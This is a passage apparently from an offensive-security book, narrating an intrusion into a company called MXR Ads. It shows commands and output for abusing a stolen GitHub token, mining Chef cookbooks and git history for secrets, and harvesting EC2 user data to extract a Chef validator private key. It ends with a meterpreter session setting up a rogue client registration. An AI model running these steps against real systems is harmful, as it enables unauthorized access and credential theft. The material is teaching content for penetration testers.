
Secrets and passwords are a crucial element of any server’s configuration—especially one that, by the very nature of its design, talks to almost every component of the infrastructure. I am talking about Jenkins, of course!

If you follow good DevOps practices to the letter, everything should be automated, reproducible, and, more importantly, versioned. You can’t just install Jenkins or any other tool by hand. You must use a management tool, like Chef or Ansible, to describe your Jenkins configuration and deploy it on a brand-new machine. Any change to this configuration, like upgrading a plug-in or adding a user, should go through this management tool, which tracks, versions, and tests the changes before applying them to production. That’s the essence of infrastructure as code. What’s a developer’s favorite versioning system for storing code? GitHub, of course!

We can quickly verify that Chef recipes are stored on GitHub for this task by listing all of MXR Ads’ private repos and looking for any mention of Jenkins-related Chef cookbooks. Remember, we already have a valid GitHub token courtesy of Kubernetes. We first extract the list of repos:

```
# list_repos.py
from github import Github
g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")
for repo in g.get_user().get_repos():
    print(repo.name, repo.clone_url)
```

We then search for references to keywords such as cookbook, Jenkins, Chef, recipe, and so forth (see Listing 10-6).

```
root@Point1:~/# python3 list_repos.py > list_repos.txt
root@Point1:~/# egrep -i "cookbook|jenkins|chef" list_repos.txt
cookbook-generator https://github.com/mxrads/cookbook-generator.git
cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git
--snip--
```

Listing 10-6: A list of MXR Ads’ repos matching at least one of the keywords cookbook, Jenkins, and Chef

Bingo! We download the cookbook-mxrads-jenkins-ci repo:

```
root@Point1:~/# git clone https://github.com/mxrads/cookbook-mxrads-jenkins-ci.git
```

And then we go through the source code hoping to find some hard-coded credentials:

```
root@Point1:~/# egrep -i "password|secret|token|key" cookbook-jenkins-ci

default['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
default['jenkins']['keys']['operations_price_cipher_crypto_key'] = 'AQICAHhKmtEfZE...'
```

We find that close to 50 secrets are defined in a file conveniently called secrets.rb, but don’t get excited just yet. These are no mere cleartext passwords. They all start with the six magic letters AQICAH, which suggests they use AWS KMS, a key management service provided by AWS to encrypt/ decrypt data at rest. Access to their decryption key requires specific IAM rights, which our user Kevin most likely lacks. The README file of the cookbook is pretty clear about secret management:

```
# README.md

KMS Encryption :

Secrets must now be encrypted using KMS. Here is how to do so.
Let's say your credentials are in /path/to/credentials...
```

The one keyword I love in that sentence is “now.” This suggests that not so long ago secrets were handled differently, probably not encrypted at all. We take a look at the Git commit history:

```
root@Point1:~# git rev-list --all | xargs git grep "aws_secret"

e365cd828298d55...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZECJ0Q9X1w...'

623b30f7ab4c18f...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZECJ0Q9X1w...'
```

Someone must have properly cleaned it up. All previous versions of secrets.rb contain the same encrypted data.

That’s okay. GitHub is not the only versioned repository to store cookbooks. Chef has its own local datastore where it keeps different versions of its resources. With some luck, maybe we can download an earlier version of the cookbook that contained cleartext credentials.

Communication with the Chef server is usually well protected. Each server managed by Chef gets a dedicated private key to download cookbooks, policies, and other resources. Admins may also use an API token to perform tasks remotely.

The silver lining, however, is that there is no segregation between resources. All we need is a valid private key, belonging to a dummy test server for all we care, to be able to read every cookbook file ever stored on Chef. What’s life without trust!

That private key should not be too hard to find. We have read access to the EC2 API, spanning around 2,000 servers. Surely one of them has a hardcoded Chef private key in its user data. We just need to perform 2,000 API calls.

What may seem like a daunting and fastidious task at first can actually be easily automated. Thanks to the cookbooks stored in MXR Ads’ GitHub repos, we already know which services rely on Chef: Cassandra (NoSQL database), Kafka (streaming software), Jenkins, Nexus (code repository), Grafana (dashboards and metrics), and a few more.

We store these service names as keywords in a file and then feed them to a loop that retrieves the instances bearing a tag name matching the keyword, as shown next. We extract the first instance ID of every pool of machines belonging to the same service since, for example, all Cassandra machines will probably share the same user data, so we only need one instance:

```
root@Point1:~/# while read p; do
  instanceID=$(aws ec2 describe-instances \
  --filter "Name=tag:Name,Values=*\$p*" \
  --query 'Reservations[0].Instances[].InstanceId' \
  --region=eu-west-1 \
  --output=text)
  echo $instanceID > list_ids.txt
done <services.txt
```

This rather improvised sampling method gives us about 20 instance IDs, each referring to a machine hosting a different service:

```
root@Point1:~/# head list_ids.txt
i-08072939411515dac
i-080746959025ceae
i-91263120217ecdef
--snip--
```

We loop through this file calling the ec2 describe-instance-attribute API to fetch the user data, decode it, and store it in a file:

```
root@Point1:~/# while read p; do
userData=$(aws ec2 describe-instance-attribute \
  --instance-id $p \
  --attribute userData \
  --region=eu-west-1 \
  | jq -r .UserData.Value | base64 -d)
echo $userData > $p.txt
done <list_ids.txt
```

> NOTE The describe-instance-attribute API call is often granted without so much as a second thought through a describe* policy. If it's blocked, we can attempt to grab the launch configuration of an auto-scaling group, which usually holds the same data: aws autoscaling describe-launch-configurations or aws ec2 describe-launch-templates.

We check to see how many files were created and confirm the files contain user data scripts:

```
root@Point1:~/# ls -l i-*.txt | wc -l
21
root@Point1:~/# cat i-08072939411515dac.txt
```

```
encoding: gzip+base64
  path: /etc/ssh/auth_principals/user
  permissions: "0644"
- content: |-
  #!/bin/bash
--snip--
```

Perfect. Now for the moment of truth. Do any of these fine servers have a Chef private key declared in their user data? We look for the “RSA PRIVATE KEY” keywords:

```
root@Point1:~# grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt
--snip--
```

```
① cat << EOF
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
) > /etc/chef/client.rb
```

```
② cat << EOF
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAg/6woPBdnwSVjcSRQenRJk0MePELfPp
--snip--
) > /etc/chef/validation.pem
```

It’s almost too easy. The first snippet of code defines key parameters used by Chef and stores them in the client.rb file. The second snippet writes a private key to a file called validation.pem.

This private key is different from the one we were hoping for, but we will make it work. The key we obtained is a validation key, the private key of the chef-validator user assigned to instances to establish their first contact with the Chef server. The chef-validator is not allowed to list machines, cookbooks, or other sensitive operations, but it has the ultimate power of registering clients (machines), which in the end grants them private keys that can perform said operations. All’s well that ends well.

This user’s private key is shared among all instances wishing to join the Chef server. So, naturally, we can also use it to register an additional machine and receive our very own private key. We just have to mimic a real client configuration and nicely ask the Chef server from within the VPC.

We create the required files to initiate a machine registration—client.rb ① and validation.pem ②—and populate them with the data harvested from the user data script, as shown next. This is just lazy copy-pasting, really:

```
meterpreter > execute -i -f cat << EOF
chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
validation_client_name 'chef-validator'
EOF
) > /etc/chef/client.rb
```
